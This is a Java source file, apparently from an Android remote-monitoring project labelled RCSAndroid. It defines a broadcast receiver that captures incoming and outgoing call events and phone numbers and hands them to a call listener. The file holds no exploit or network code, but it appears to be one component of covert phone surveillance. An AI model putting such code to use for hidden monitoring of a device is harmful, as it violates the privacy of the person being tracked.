/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : BroadcastMonitorCall.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.ht.RCSAndroidGUI.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.ht.RCSAndroidGUI.Call;

public class BroadcastMonitorCall extends BroadcastReceiver {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorCall";

	/* (non-Javadoc)
	 * @see android.content.BroadcastReceiver#onReceive(android.content.Context, android.content.Intent)
	 */
	@Override
	public void onReceive(Context context, Intent intent) {
		Call call;
	
		if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
			String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
	
			// Outgoing phone call
			Log.d("QZ", TAG + " (onReceive): 1");
			call = new Call(number, Call.OUTGOING, Call.START);
		} else if (intent.getStringExtra(TelephonyManager.EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_RINGING)) {
			String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

			// Phone is ringing
			Log.d("QZ", TAG + " (onReceive): 2");
			call = new Call(number, Call.INCOMING, Call.START);
        } else if (intent.getStringExtra(TelephonyManager.EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_IDLE)) {
        	// Call disconnected
        	call = new Call("", Call.INCOMING, Call.END);
        	Log.d("QZ", TAG + " (onReceive): 3");
        } else if (intent.getStringExtra(TelephonyManager.EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
        	// Call answered, or issuing new outgoing call
        	Log.d("QZ", TAG + " (onReceive): 4");
        	call = new Call("", Call.OUTGOING, Call.START);
        } else {
        	Log.d("QZ", TAG + " (onReceive): default");
        	call = new Call("", Call.OUTGOING, Call.END);
        }

		// Caller/Callee number, incoming?/outgoing, in progress?/disconnected
		ListenerCall.self().dispatch(call);
	}
}
